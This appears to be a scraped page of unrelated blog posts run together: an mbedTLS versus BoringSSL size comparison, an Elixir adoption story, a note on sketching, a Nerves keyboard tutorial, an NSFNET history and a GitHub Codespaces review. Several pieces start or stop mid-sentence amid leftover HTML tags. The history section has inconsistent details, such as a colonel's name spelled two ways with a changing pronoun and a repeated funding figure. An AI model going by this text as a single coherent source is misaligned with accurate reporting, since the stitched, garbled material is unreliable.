&nbsp;announced—it's not hard to guess what our preferred tech stack is) and used pretty outdated APIs (made in 2012!), he said we should. Plus, we had to change everything for it to support accounts and IAP codes.</p><p>It was tempting to try fresh-released (back then) Catalyst to avoid making two separate apps for Mac and iOS, yet there were more cons than pros and we went old-school–good ol' AppKit. Andrew was adamant that we couldn't keep torturing ourselves with NodeJS on the server anymore.

<h2 id="goals-and-assumptions">Goals and assumptions</h2>

<p>Goal is to choose most suitable TLS library that could be statically linked with an application. The application will be runing on modern mobile operating system and variety of ARM CPUs. I’m interested in client side of the TLS only. Ideal library is the one which ensures the best security, implements algorithms optimized for speed and compiles to reasonably small binary. Additionally I assume I can control both sides of the connection, meaning I’m free to choose a cipher(s) to be used for both - symmetric and assymetric encryption (without using PSK). I also have some requirements regarding licences and being open-source.</p>

<p>I’ve identified two libraries which seem to met those requirements:</p>

<ul>
<li><code>mbedTLS</code> - is a library formerly known as <code>PolarSSL</code>. It makes it fairly easy for developers to include cryptographic and TLS capabilities in embedded products. It is highly configurable, so that facilitating TLS functionality may have very small minimal coding footprint. It is currently maintained by ARM.</li>
<li><code>BoringSSL</code> - is a fork of OpenSSL maintained and used by Google. It is a default TLS library used by Android OS (starting from version M), Chrome as well as used on Cloudflare systems. I has advantage of being originated from <code>OpenSSL</code> - it means that library got a lot of reviews and testing.</li>
</ul>

<h2 id="testing-application">Testing application</h2>

<p>It’s a implementation of simple C-based test application, which compiles and links against library under test and run on ARMv8 platform running Android operating system. The app is composed of client and server. As I’m only interested in client side of the TLS end, we fix the server to always use same library (it’s based on <code>BoringSSL</code>). Server is configured to support only TLSv1.2 (as 1.3 is not supported by <code>mbedTLS</code>, yet [16]). In order to start a server, user provides an argument which specifies cetificate type to be used (RSA, ECDSA or EdDSA based). Once run it always enforces same cipher suite to be used - for example in case of RSA it will be ECDHE key agreement with RSA signature and AES/256 in GCM AEAD mode.</p>

<p>Client application is the one which I want to benchmark. I have implemented one which uses <code>mbedTLS</code> API and links with this library and similar one for <code>BoringSSL</code>. Client always establishes TCP connection in blocking mode (simplicity). It implements 3 different tests:</p>

<ul>
<li><strong>Handshake</strong> : during this test client opens TCP connection and performs many handshake without closing the connection. Performance of this test depends on key type used for certificate signing and symmetric key agreement algorithm (as well as elliptic curve used), hence this test is performed multiple times, once for each certificate type</li>
<li><strong>Write</strong>: clients opens TCP connection and sends few hundred megabytes of data. This test is done mostly to assess performance of symmetric encryption</li>
<li><strong>Read</strong>: clients opens TCP connection and sends a request to the server which sends back few hundred megabytes of data. This test is done mostly to assess performance of symmetric decryption</li>
</ul>

<h2 id="binary-size-reduction">Binary size reduction</h2>

<h3 id="mbedtls">mbedTLS</h3>

<p><code>mbedTLS</code> makes it possible to select features of TLS library before compile time. Configuration template is available in <code>config.h</code> file and is managed by definining or disabling number of preprocessor symbols (look for <code>MBEDTLS_CONFIG_FILE</code> for more details). This is an easy way for developers to include cryptographic and (optional) SSL/TLS capabilities in their products, facilitating those functionalities with a minimal coding footprint. Indeed, it is interesting feature for memory constrained devices (for example microcontrollers).</p>

<p><code>mbedtls</code> compilation produces 3 separated libraries - crypto, ssl and x509 library. Compilation also outputs number of test binaries.</p>

<p>As a first step I have applied set of obvious size optimization provided by compiler (<code>-Os</code>) and stripped all the symbols (they can be stored in separated file if needed). I also applied <code>-ffuntion-sections</code> and <code>--fdata-sections</code> options to the compiler. This will cause compiler to place each function or data item into its own section. Then thanks to <code>-Wl,--gc-sections</code> linker will be able to chose only those sections which are actually used, which makes resulting binary much smaller (one can add <code>-Wl,--print-gc-sections</code> in order to see removed sections). This optimization may produce unexpected results, so I strongly advice to look at documentation and get familiar with the details of this optimization.</p>

<p>In a second step I have changed <code>config.h</code> file and removed capabilities which are not needed by our client application, leaving following capabilities only:</p>

<ul>
<li>TLS client side code</li>
<li>TLS v1.2</li>
<li>AES-GCM used as a symmetric cipher</li>
<li>RSA, ECDSA and ECDH with curves P-256</li>
<li>SHA-256 and SHA-512</li>
<li>Code for key pre-sharing has been removed</li>
<li>Some additional features required by the client code</li>
</ul>

<p>In a third step I’ve removed support of RSA, which from one hand isn’t actually necessarily, as I control both sides of a connection, and from the other hand it’s interesting how much binry size get’s reduced.</p>

<p>The test client has been reduced more than 4 times and indeed to very small size. Further reductions are possible (see [8] for ideas), nevertheless at this point I’m satisfied with the size and I don’t think it is possible to change it much. Also removing RSA reduces a size only by 20 bytes, so I’ve decided to keep RSA and pay a little penalty.</p>

<p>Also it’s worth noting that 48KB for TLSv1.2 implementation is really small memory footprint. Very interesting for small devices which implement most of needed crypto in hardware.</p>

<h3 id="boringssl">BoringSSL</h3>

<p>Similar experiment as bove has been done with BoringSSL. This library doesn’t offer so many configuration possibilities as <code>mbedTLS</code>, nevertheless it provides some.</p>

<p>In the first step I’ve applied exactly same compiler flags as in case of <code>mbedTLS</code> (<code>-Os</code>, symbol strip, indexing data&amp;function sections).</p>

<p>In a second step I’ve applied <code>OPENSSL_SMALL=1</code> configuration option. This tells the compiler to use algorithm implementation which is optimized for size rather than for speed (see [12] for more details).</p>

<p>In a third step I’ve tried to remove assembly implementation. For some algorithms this causes huge performance degradation as some optimizations are written in assembly as well as hardware acceleration needs a “glue” code which is written in assembly. Nevertheless, it is interesting step when comparing against <code>mbedTLS</code>, as it doesn’t have any such optimizations currently (see [6]).</p>

<p><code>BoringSSL</code> provides concept of <em>crypto buffers</em> which can be used instead of some functions from memory hungry X509 and ASN.1 implementation. This feature together with indexing data&amp;function sections (done in first step) greatly reduces binary size. We have used it in step 4. In step 5 we go a bit further - need for X509 and ASN.1 can be complatelly removed, assuming user provides custom certificate verification function. My client doesn’t implement such function, but from one hand it shouldn’t be very complicated to implement such function and also code size of such function won’t change much final binary size. Hence it’s interesting to see a result of size reduction.</p>

<p>In last step I’ve tried to introduce more aggressive changes to the comment out (with preprocessor symbols) RSA and DH implementation.</p>

<p>I’m positivelly surprised by the fact that it is possible to remove X509 and ASN.1 code, it gives you really small library. At the moment I don’t want to implement my own certificate verification function and I want to perform certificate verification during performance benchmarking. But it’s worth noting that with fairly small cost …</p></article></div></div></div></div>

Late last year, we were faced with the challenge of modernizing our notifications system for end-users by making it fit for both the changing requirements of the industry, and our internal development teams. In this post, I’ll walk you through some of the considerations and learnings we encountered along the way. It will not be a deep dive into the language and its surrounding ecosystem, but instead I’ll offer a glimpse into how we approach language and technology evaluation and adoption.</p>
<!--more-->
<p>In its then current state, our notification system was baked into some older parts of our service ecosystem and heavily resisted far-reaching changes. We also felt that utilising more modern, ubiquitous technologies like WebSockets would suit us better and provide our users with a more engaging experience – and well, let’s just say it had a host of other small problems that made it a prime candidate for a rewrite.</p>
<p>Now a rewrite does not require a change in technologies: we could have stuck to the more or less blessed stack of Node.js/Typescript for our back-end, but we realised an opportunity here try something new in a part of the application that is not necessarily on the hot-path.</p>
<p>In other words, we were in a fairly good position to experiment and explore.</p>
<p>We set off on a scoping and requirements gathering exercise, and managed to draw a circle around the features we wanted to build and deliver in due time. One of the themes that kept creeping up from our discoveries was user experience: the look and feel of the whole thing.</p>
<p>Our goal was to provide a slick, real-time experience to our users. There are a couple of technologies currently available that can facilitate this, but WebSockets was the most mature solution for this. The next steps were to track down some language and framework combinations that have significant support for long-running WebSocket connections.</p>
<p>Apart from UX demands, we also set some expectations from an engineering point of view:</p>
<ol>
<li>There need to be strong primitives in the framework - with strong community support - for both building and testing persistent connections, queuing, storage, etc.&nbsp;</li>
<li>If we have to fight the framework, we’re doing it wrong. It should be opinionated enough, <strong>without</strong> getting in the way.</li>
<li>If we can reduce moving parts, we’re doing it right.</li>
</ol>
<p>With these requirements in hand, we opened up the floor for any suggestions and sure enough, one option quite quickly gained traction.</p>
<h3>Why Elixir?</h3>
<p>Elixir is a fairly new language, but it runs on extraordinarily robust and battle-tested concepts and technology, at least by modern-day web development standards. It builds and runs on top of the Erlang VM, doing so — in part — by leveraging Erlang/OTP.</p>
<p>OTP, the <a href="https://en.wikipedia.org/wiki/Open_Telecom_Platform" rel="noopener" target="_blank"><span>Open Telecom Platform</span></a>, is a collection of tools, libraries and middleware that enable developers to build scalable, robust systems. It is the lower-level ecosystem supporting Erlang – and thus Elixir – development.&nbsp;</p>
<p>I consider Elixir to be a niche language, albeit a very mainstream and capable language within that particular niche. It might not be the fastest or most optimized, but it commits to a few core tenets – concurrency, fault tolerance and isolation of errors, persistent connections – and executes on those really well.</p>
<p>Ultimately, we selected Elixir based on a couple of reasons:</p>
<ol>
<li>Developer Experience – Elixir has a reputation for not only being developer-friendly, but having developer experience and productivity at its core</li>
<li>Integrated feedback loop – Coming from Node.js, having the One True Way to run unit and integration tests, and have a very clean way of running these in parallel is refreshing.</li>
<li>Purpose – As mentioned above, our requirement was to support and build upon a system of near-real time communication. Many other technologies do offer some level of library support, but we were hard-pressed to find a better solution than the primitives and higher level constructs provided by Elixir and Phoenix.</li>
<li>Interest – A very enthusiastic engineer within the team took ownership of this project</li>
</ol>
<h3>Our first steps in Elixir</h3>
<p>Once we had settled on Elixir, we were ready to roll our sleeves and&nbsp; actually start building something. This is where the champion steps in – a person who not only shows interest in the topic but is also willing to coach and mentor their peers. In my experience, it’s quite risky to try to adopt something that no one in the team has any experience in.</p>
<p>In true champion spirit, one of our own team members took ownership of building the seed project. While he was busy tinkering away, we purchased some books, found some tutorials, installed the blessed extensions and started learning this shiny new stack. It did not take long for us to have <em>something</em>; it was missing a lot of functionality, but it was just enough to give us a taste of how the language is structured, how the web framework hangs together and how we deploy it.</p>
<p>Now of course, introducing a new stack is not all smooth sailing. It should come as no surprise that the cost of adopting something new comes with a substantial amount of minutiae that need addressing. We had established ways of running services within our infrastructure, and our job now was to slot our Elixir-based service into that infrastructure.</p>
<p>From getting logging to work, having a working Prometheus endpoint, and integrating with our internal authentication mechanisms – let’s just say we had quite a few boxes to tick in order to get everything to play nicely.</p>
<p>But in the end, we have something that works! So let’s talk about some of our key learnings.</p>
<h4>Clusters within clusters —&nbsp;Understand where Kubernetes ends and Erlang/OTP begins</h4>
<p>There are competing, yet complementary philosophies at play here. The application is running on top of <a href="https://www.youtube.com/watch?v=p_6Dl0iII9U" rel="noopener" target="_blank"><span>Kubernetes within Smartly</span></a>, which brings with it a whole raft of *stuff* – a scheduler, failure detection, logging integration, load balancers... everything <strong>and</strong> the kitchen sink.</p>
<p>The application itself is running on top of Erlang/OTP, which in turn drags a fair bit of tooling and opinionation into the fray - failure detection, process management, supervision tree(s). You name it, it’s probably there somewhere.</p>
<p><strong>Jose Valim</strong>, the creator of Elixir, has written in depth about <a href="http://blog.plataformatec.com.br/2019/10/kubernetes-and-the-erlang-vm-orchestration-on-the-large-and-the-small/"><span>how these two runtimes coexist</span></a>, and at large, the technical aspect of his argument is sound. But what we’ve observed is that there are a few challenges with regards to expectations that needed to be overcome.</p>
<h4>Failure escalation — Come to grips with how failure occurs and propagates</h4>
<p>Our main competency within the team is running Node.js applications, and while a lot can be said about Node.js, it is not a complex programming model. There’s a script, you run the script, it blows up or keeps on running. Everything else is yours to manage and control.</p>
<p>Elixir really tries <strong>hard</strong> not to crash the entire underlying process, so it will let parts of the application crash and burn, after which the supervisor will reconstruct processes in your supervision tree based on configuration. Kubernetes does <strong>not</strong> get involved here, so our regular approach of finding out bad things are happening simply does not apply.</p>
<p>This happened recently when a critical part of the application was unable to talk to an underlying database, and instead of the usual symptom – pods crashing and burning left, right and centre, making our alerting system go off like nothing else – we were faced with an application that <em>looked functional</em> <em>on the surface</em>, but was heroically trying to stem the flood of dying processes internally. Needless to say, we added more monitoring and learnt our lesson.</p>
<h4>One is the loneliest number — Account for redundancy in a stateful system</h4>
<p>Traditionally, one of the hardest steps to take when scaling your infrastructure is to go from one to two. When vertical scaling is no longer a viable or preferred option, teams need to look at horizontal scaling instead. In the current landscape of Kubernetes clusters and small, disposable services, horizontally scaling your application has even become the de facto standard.</p>
<p>This puts the onus on us to design a system that can work in a distributed way. For all intents and purposes this would be easy if we were planning to run a simple request-response system, but we’re not: we’re aiming to build a distinct-per-user perpetually connected system. So the one thing we really don’t want to deal with is duplicated websocket connections, or having to duplicate our message handling. In short, all copies of our application need to be able to communicate <strong>with one another</strong> and pass user-bound notifications to the copy of the application that has initially established the WebSocket connection to said user.</p>
<p>Luckily, this is not an unsolved problem. Even more fortunately, a solution is provided within <a href="https://phoenixframework.org/" rel="noopener" target="_blank"><span>Phoenix</span></a> — the de-facto Elixir web application framework - itself. This solution takes the shape of <a href="https://hexdocs.pm/phoenix_pubsub/Phoenix.PubSub.html" rel="noopener" target="_blank"><span>Phoenix PubSub</span></a>. At its core, this would allow our applications to communicate with one another. If PubSub is the API by which applications would communicate, it does not by itself provide the means by which information makes it from one application to another. This message transport back-end needs to be provided separately, and take the form of <strong>adapters.</strong></p>
<p>There are two adapters currently available, Redis and PG2. We could have chosen Redis, as we do have some expertise in-house on how to run this at scale. But that would have introduced another moving part to the equation, and we were keen to keep as much as we could contained within the application itself. So that brings us to PG2, a solution that leverages Distributed Erlang in allowing Erlang processes to communicate across servers. In order for us to have this ability, we have to lean on one final component within our toolbox, namely <a href="https://github.com/bitwalker/libcluster" rel="noopener" target="_blank"><span>libcluster</span></a>. This Erlang clustering …</p></span></p></div></div></div></div></div></div></div></div></div></div>

    <p>My drawing process is (nearly) always the same; I grab a pen, stroke the main lines of something I see, add detail, and shade. Afterwards, I make a decision based on how much I like the drawing and how much time is available to finish it—whether to add color or not.</p>
<p>I might get in love with the plain, black-and-white drawing and feel scared of spoiling the piece with watercolor even when I know color adds another dimension to the story told by my sketch. But I've been practicing.</p>
<p>The stress of coloring fades away the more I practice, and the positive feedback loop makes me color more of my sketches, improving my skill at the same time.</p>
<p>I've scanned certain drawings before and after coloring. This, apart from letting me keep a copy of the uncolored version of the drawing, might serve to train a machine learning algorithm which might learn <a href="https://sketch.nono.ma/suggestive-drawing">how I color my sketches</a>.</p>

<p>That fear of ruining what's half-done prevents us from improving.</p>
<p>Let's beat the resistance.</p>

<p><a href="https://devchat.tv/elixir-mix/emx-102-nerves-powered-mechanical-keyboards-with-chris-dose/">
        Chris Dosé was interviewed</a> by us on Elixir Mix. When he spoke about his work on a Nerves-powered keyboard I knew this was a
    project I wanted to try out. So I dropped into their dev channel, acquired the hardware (thanks for the help) and have done some playing
    around with it.
</p>
<p>
    So what is the draw of a Nerves keyboard? Well, you can program it in Elixir. That's a big one for me personally.
    It also means that compared to a lot of high-level languages driving hardware you have pretty strong performance
    characteristics, resilience and specifically with Nerves a lot of best practices for running embedded hardware.
    It makes managing firmware updates easier, it mitigates corruption on SD cards and lots more. As an Elixir
    developer the pure convenience of customizing the keyboard in my favored language is of course delightful.
</p>
<p>
    This post should help you try it out if you have/get the required hardware. The project is currently using the Keybow
    keypad as a prototyping platform to figure out how things should work while they work on the details of a full
    keyboard and it is a neat little gadget, whatever you want to do with it.</p>
<h2>Getting started</h2>
<p>Requirements to try this:</p>
<ul>
<li>A Keybow kit, with Pi Zero (<a href="https://www.adafruit.com/product/4144">Adafruit</a>)</li>
<li>Micro USB Cable</li>
<li>Micro SD Card</li>
</ul>
<p>To get up and running you should:</p>
<ul>
<li><a href="https://hexdocs.pm/nerves/installation.html">Set up Nerves according to these instructions</a></li>
<li>Follow the <a href="https://github.com/ElixirSeattle/xebow">instructions at the xebow repo</a></li>
</ul>
<p>
    The installation guide might not tell you to go into <code>assets</code> and run <code>npm install</code> but I think
    you have to. I'm not going to tell you how to install Node and NPM because it varies. But you can probably find it <a href="https://nodejs.org/en/download/">around the Node site</a>.
</p>
<p>
    If you reach the point of having burned the firmware to your SD Card, congratulations. We are ready to play.
</p>
<h2>First firmware on the device</h2>
<p>So plug the SD card with your pristine Xebow firmware into the Keybow contraption and plug the Keybow into your
    computer
    with the Micro USB cable. Startup can take a little bit but it should settle into cycling through rainbow colors
    after a
    bit. It should also produce numbers when you poke it (the default keymap is a numpad plus some extras).</p>
<h2>Making changes</h2>
<p>I don't need a single numpad and now I have two of them. Let's make this more useful. Open
    <code>lib/xebow/keyboard.ex</code>
    in your preferred editor.</p>
<p>Replace the default keymap with:</p>
<pre data-file="lib/xebow/keyboard.ex"><span></span>    <span>@keymap</span> <span>[</span>
    <span># THE NAVIGATOR!</span>
    <span>%{</span>

    <span>}</span>
  <span>]</span>
</pre>
<p>And then:</p>
<pre data-file="/">export MIX_TARGET=keybow
mix firmware
mix firmware.gen.script
./upload.sh xebow.local
</pre>
<p>Sometimes the upload process can be finicky. You can always re-burn the firmware to the SD card instead using
    <code>mix firmware.burn</code> instead of the <code>gen.script</code>.</p>
<h2>The navigator</h2>
<p>So with the Keybow on its side, four wide. You'll have this fantastic navigation machine at your disposal.
    Top row are arrows, middle row is VIM navigation or GMail or wherever else the don't-move-your-fingers approach is
    used.
    Bottom row are the extremes of the first row.</p>
<table>
<tbody><tr>
<td>Left</td><td>Down</td><td>Up</td><td>Right</td>
</tr>
<tr>
<td>H</td><td>J</td><td>K</td><td>L</td>
</tr>
<tr>
<td>Home</td><td>PgDn</td><td>PgUp</td><td>End</td>
</tr>
</tbody></table>
<h2>Layers?</h2>
<p>So my plan for the keyboard just filled the entire keypad. But the xebow application supports layers, so you can do
    some
    interesting stuff there. I considered doing a chorded keyboard but I'm terrible at them and decided on this as
    something
    I might actually use. There are plenty of cool things you can do with Layers if you want.</p>
<h2>The Future</h2>
<p>The folks in #nerves-keyboard (on the <a href="https://elixir-slackin.herokuapp.com/">Elixir Slack</a>) are hard at work figuring out a real mechanical keyboard
    schematic
    that should be a very cool thing to own and play with. Most of the conversation in there right now is about PCB's, CAD and hardware layout. They are a welcoming bunch. So enjoy :)</p>
<p>If this post was good, or has problems that need fixing, let me know at <a href="mailto:lars@underjord.io">lars@underjord.io</a> or <a href="https://twitter.com/lawik">@lawik</a> on Twitter. If you want more of my writing I have
a non-tracking newsletter which tends to cover quality and sustainability in software.</p>

		<p><span>In 1990, John Quarterman, a networking consultant and UNIX expert, published a comprehensive survey of the state of computer networks. In a brief section on the potential future for computing, he predicted the appearance of a single global network for “electronic mail, conferencing, file transfer, and remote login, just as there is now one worldwide telephone network and one worldwide postal system.” But he did not assign any special significance to the Internet in this process. Instead, he assumed that the worldwide net would “almost certainly be run by government PTTs”, except in the United States, “where it will be run by the regional Bell Operating Companies and the long-distance carriers.”</span></p>
<p><span>It will be the purpose of this post to explain how, in a sudden eruption of exponential growth, the Internet so rudely upset these perfectly natural assumptions.</span></p>
<h2><b>Passing the Torch</b></h2>
<p><span>The first crucial event in the creation of the modern Internet came in the early 1980s, when the Defense Communication Agency (DCA) decided to split ARPANET in two. The DCA had taken control of the network in 1975. By that time, it was clear that it made little sense for the ARPA Information Processing Techniques Office (IPTO), a blue sky research organization, to be involved in running a network that was being used for participants’ daily communications, not for research </span><i><span>about</span></i><span> communication. ARPA tried and failed to hand off the network to private control by AT&amp;T. The DCA, responsible for the military’s communication systems, seemed the next best choice.</span></p>
<p><span>For the first several years of this new arrangement, ARPANET prospered under a regime of benign neglect. However, by the early 1980s, the Department of Defense’s aging data communications infrastructure desperately needed an upgrade. The intended replacement, AUTODIN II, which DCA had contracted with Western Union to construct, was foundering. So DCA’s leaders appointed Colonel Heidi Hieden to come up with an alternative. He proposed to use the packet-switching technology that DCA already had in hand, in the form of ARPANET, as the basis for the new defense data network.</span></p>
<p><span>But there was an obvious problem with sending military data over ARPANET – it was rife with long-haired academics, including some who were actively hostile to any kind of computer security or secrecy, such as Richard Stallman and his fellow hackers at the MIT Artificial Intelligence Lab. Heiden’s solution was to bifurcate the network. He would leave the academic researchers funded by ARPA on ARPANET, while splitting the computers used at national defense sites off onto a newly formed network called MILNET. This act of mitosis had two important consequences. First, by decoupling the militarized and non-militarized parts of the network, it was the initial step toward transferring the Internet to civilian, and eventually, private, control. Secondly, it provided the proving ground for the seminal technology of the Internet, the TCP/IP protocol, which had first been conceived half a decade before. DCA required all the ARPANET nodes to switch over to TCP/IP from the legacy protocol by the start of 1983. Few networks used TCP/IP at that point in time, but now it would link the two networks of the proto-Internet, allowing message traffic to flow between research sites and defense sites when necessary. To further ensure the long-term viability of TCP/IP for military data networks, Heiden also established a $20 million fund to pay computer manufacturers to write TCP/IP software for their systems (1).</span></p>
<p><span>This first step in the gradual transfer of the Internet from the military to private control provides as good an opportunity as any to bid farewell to ARPA and the IPTO. Its funding and influence, under the leadership of J.C.R. Licklider, Ivan Sutherland, and Robert Taylor, had produced, directly or indirectly, almost all of the early developments in interactive computing and networking. The establishment of the TCP/IP standard in the mid-1970s, however, proved to be the last time it played a central role in the history of computing (2).</span></p>
<p><span>The Vietnam War provided the decisive catalyst for this loss of influence. Most research scientists had embraced the Cold war defense-sponsored research regime as part of a righteous cause to defend democracy. But many who came of age in the 1950s and 1960s lost faith in the military and its aims due to the quagmire in Vietnam. That included Taylor himself, who quit IPTO in 1969, taking his ideas and his connections to Xerox PARC. Likewise, the Democrat-controlled Congress, concerned about the corrupting influence of military money on basic scientific research, passed amendments requiring defense money to be directed to military applications. ARPA reflected this change in funding culture in 1972 by renaming itself as DARPA, the </span><i><span>Defense </span></i><span>Advanced Research Projects Agency.</span></p>
<p><span>And so the torch passed to the civilian National Science Foundation (NSF). By 1980, with $20 million dollars in funding, the NSF accounted for about half of federal computer science research spending in the U.S, about $20 million (3)</span><span>. Much of that funding would soon be directed toward a new national computing network, the NSFNET.</span></p>
<h2><b>NSFNET</b></h2>
<p><span>In the early 1980s, Larry Smarr, a physicist at the University of Illinois, visited the Max Planck Institute in Munich, which hosted a Cray supercomputer that it made readily available to European researchers. Frustrated at the lack of equivalent resources for scientists in the U.S., he proposed that the NSF fund a series of supercomputing centers across the country (4)</span><span>. The organization responded to Smarr and other researchers with similar complaints by creating the Office of Advanced Scientific Computing in 1984, which went on to fund a total of five such centers, with a total five-year budget of $42 million. They stretched from Cornell in the northeast of the country to San Diego in the southwest. In between, Smarr’s own university (Illinois) received its own center, the National Center for Supercomputing Applications (NCSA).</span></p>
<p><span>But these centers alone would only do so much to improve access to computer power in the U.S. Using the computers would still be difficult for users not local to any of the five sites, likely requiring a semester or summer fellowship to fund a long-term visit. And so NSF decided to also build a computer network. History was repeating itself – making it possible to share powerful computing resources with the research community was exactly what Taylor had in mind when he pushed for the creation of ARPANET back in the late 1960s. The NSF would provide a backbone that would span the continent by linking the core supercomputer sites, then regional nets would connect to those sites to bring access to other universities and academic labs. Here NSF could take advantage of the support for the Internet protocols that Heiden had seeded, by delegating the responsibility of creating those regional networks to local academic communities.</span></p>
<p><span>Initially, the NSF delegated the setup and operation of the network to the NCSA at the University of Illinois, the source of the original proposal for a national supercomputer program. The NCSA, in turn, leased the same type of 56 kilobit-per-second lines that ARPANET had used since 1969, and began operating the network in 1986. But traffic quickly flooded those connections (5)</span><span>. Again mirroring the history of ARPANET, it quickly became obvious that the primary function of the net would be communications among those with network access, not the sharing of computer hardware among scientists. One can certainly excuse the founders of ARPNET for not knowing that this would happen, but how could the same pattern repeat itself almost two decades later? One possibility is that it’s much easier to justify a seven-figure grant to support the use of eight figures worth of computing power, than to justify dedicating the same sums to the apparently frivolous purpose of letting people send email to one another. This is not to say that there was willful deception on the part of the NSF, but that just as the anthropic principle posits that the physical constants of the universe are what they are because otherwise we couldn’t exist to observe them, so no publicly-funded computer network could have existed for me to write about without a somewhat spurious justification.</span></p>
<p><span>Now convinced that the network itself was at least as valuable as the supercomputers that had justified its existence, NSF called on outside help to upgrade the backbone with 1.5 megabit-per-second T1 lines (6)</span><span>. Merit Network, Inc., won the contract, in conjunction with MCI and IBM, securing $58 million in NSF funding over an initial five year grant to build and operate the network. MCI provided the communications infrastructure, IBM the computing hardware and software for the routers. Merit, a non-profit that ran a computer network that linked the University of Michigan campuses (7)</span><span>, brought experience operating an academic computer network, and gave the whole partnership a collegiate veneer that made it more palatable to NSF and the academics who used NSFNET. Nonetheless, the transfer of operations from NCSA to Merit was a clear first step towards privatization.</span></p>

<p><span>Traffic flowed through Merit’s backbone from almost a dozen regional networks, from the New York State Education and Research Network (NYSERNet), interconnected at Cornell in Ithaca, to the California Education and Research Federation Network (CERFNet -no relation to Vint), which interconnected at San Diego. Each of these regional networks also internetted with countless local campus networks, as Unix machines appeared by the hundreds in college labs and faculty offices. This federated network of networks became the seed crystal of the modern Internet. ARPANET had connected only well-funded computer researchers at elite academic sites, but by 1990 almost anyone in post-secondary education in the U.S – faculty or student – could get online.

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
                                <p>Github recently launched their new <a href="https://github.com/features/codespaces">Github codespaces</a> service - an online, in-browser Integrated Development Environment powered by <a href="https://code.visualstudio.com/">Visual Studio Code</a>. This environment allows someone to quickly load a virtual machine and a complete code editing interface, that is all accessible within the browser without having to install anything on the users machine. If you are familiar with products like <a href="https://aws.amazon.com/cloud9/">Amazon Web Services’s Cloud 9 IDE</a> or its predecessor C9.io this will probably feel very familiar.</p>

<p>As one of the lucky few who were given access to the GitHub Codespaces beta program I had the opportunity to test it out and offer my thoughts on behalf of the Aristotle team below.</p>

<h2 id="first-impressions">First impressions</h2>
<p>There were a few small changes that needed to be done to the <a href="https://www.aristotlemetadata.com/">Aristotle Metadata home page</a>, (including making this blogpost) and it was easy opening a Codespace to start working. Opening a code space for a project is literally as easy as GitHub says - click “Open in Codespace” on a repository and it does the rest - no need to configuring or decommission a server, its all handled for you.</p>

<p><img src="https://www.aristotlemetadata.com/aristotle/images/blog/codespaces/codespaces-opening-project.png" alt="How to open Codespaces" title="How to open Codespaces"></p>

<p><a href="https://www.aristotlemetadata.com/">Our website</a> is a basic <a href="https://jekyllrb.com/">Jekyll</a> static site, and offers a great basic test of whats available in Codespaces already. Loading a fresh Codespace took less than 2 minutes, which is comparable to AWS Cloud9. As someone who used Cloud9 when it was still C9.io, Codespaces reminded me a lot of that - its a simple way to open an editor and a virtual machine for a GitHub project.</p>

<p>The <a href="https://docs.github.com/en/github/developing-online-with-codespaces/about-codespaces">documentation for Codespaces</a> is also great. What I didn’t know is that GitHub can also <a href="https://docs.github.com/en/github/developing-online-with-codespaces/personalizing-codespaces-for-your-account">load your dotfiles directly into each new Codespace</a>, so your preferences (<code>.bashrc</code> and similar files) will follow you across Codespaces.</p>

<h2 id="editing-files">Editing files</h2>
<p>Being based on Visual Studio Code, <strong>Yes, Codespaces has a Dark Mode</strong>.</p>

<p><img src="https://www.aristotlemetadata.com/aristotle/images/blog/codespaces/codespaces-dark-editor.png" alt="Default Codespaces Editor" title="Default Codespaces Editor"></p>

<p>Although if you are using different browsers to open your workspace (which I had to do for reasons below), your colour scheme preferences won’t follow you across browsers. I’m not a regular user of Visual Studio Code, but it seems to includes all the standard features you expect from a browser, such as syntax highlighting, VIm and Emac keybindings (which work very well in browser), and autosave which is enabled by default, and I promptly disabled.</p>

<p>You can also drag-and-drop files from your local machine into Codespaces filesystem, and preview and edit certain non-text files in the browser, such as images, both of which are really handy for web development.</p>

<h2 id="terminal-emulator">Terminal emulator</h2>
<p>Codespaces includes a powerful terminal editor that seems to be based on a stock Debian image. The only thing I didn’t like is that separate terminals are accessed using a dropdown instead of with tabs, but this is a minor detail.</p>

<p><strong>Big news: Docker is here</strong>, and it works well.</p>

<p><img src="https://www.aristotlemetadata.com/aristotle/images/blog/codespaces/codespaces-docker.png" alt="Docker in Codespaces" title="Docker in Codespaces"></p>

<p>One of my biggest issues with C9.io was the lack of Docker support, which was solved when AWS bought Cloud9 but comes with the extra complexity of configuring your Amazon machine. So being able to simply run Docker in the browser is great. Docker-compose isn’t installed by default, and I haven’t had a chance to see how that works.</p>

<p>The only issue I found with the terminal emulator was you can only paste with right-click into Chromium-based browsers like Chrome or Edge, <em>Firefox users beware</em>.</p>

<h2 id="serving-sites">Serving sites</h2>
<p><a href="https://docs.github.com/en/github/developing-online-with-codespaces/developing-in-a-codespace">Codepsaces does a great job of handling port forwarding for you </a>, so you can simply start you server process (on a non-Port 80 port) and if GitHub detects a <code>localhost:PORT</code> combination it makes it accessible for you by clicking on the URL, as shown below:</p>

<p><img src="https://www.aristotlemetadata.com/aristotle/images/blog/codespaces/codespaces-jekyll.png" alt="Jekyll in Codespaces" title="Jekyll in Codespaces"></p>

<p>Loading and reloading Jekyll was fast, and by the time I clicked the forwarded link or switched tabs to preview changes to the site, it was already refreshed. 
<del><strong>However, this is another Chromium-only feature the clikcable port forward links don’t work in Firefox</strong></del>  this seems to be fixed now in Firefox.</p>

<p>One other minor issue is you can’t open your site in a private window or different browser to view the server without logging into GitHub. This isn’t a huge issue, but if you are trying to view what your site looks like under different browser or when logged out it can be troublesome.</p>

<p><img src="https://www.aristotlemetadata.com/aristotle/images/blog/codespaces/codespaces-final-site.png" alt="Aristotle Home Page in Codespaces" title="Aristotle Home Page in Codespaces"></p>

<h2 id="final-thoughts">Final thoughts</h2>

<p><strong>This is amazing</strong> and may become my default IDE - as a co-founder who is spending less time as a developer, and more time in meetings, writing emails, strategy papers, letters and tenders, <em>this is just amazing</em>! Most of my daily tools are Windows based, so I’ve been spending a lot of time getting Windows Subsystem for Linux working alongside the rest of my daily workflow, which comes with its own headaches. So being able to quickly checkout a branch, make changes and take some load of my local machine seems very promising.</p>

<p>There are a lot of features here to review that I haven’t had a chance to look at, including collaborative workspaces, Git integration and connecting with a local version of Visual Studio, but from a quick glance everything works smoothly.</p>

<p>Overall, it’s an extremely quick way to get started on a project, and I look forward to writing an update after I’ve had a chance getting the Aristotle Metadata Registry software, with all its many dependencies, running in codespaces under Docker-compose.</p>

<p><strong>The Aristotle Metadata Registry is no stranger to cloud innovation</strong>. If you want to learn how to access a cloud-hosted metadata registry as simple as Github’s Codespaces <a href="https://www.aristotlemetadata.com/contact.html">get in contact with us</a>.</p>

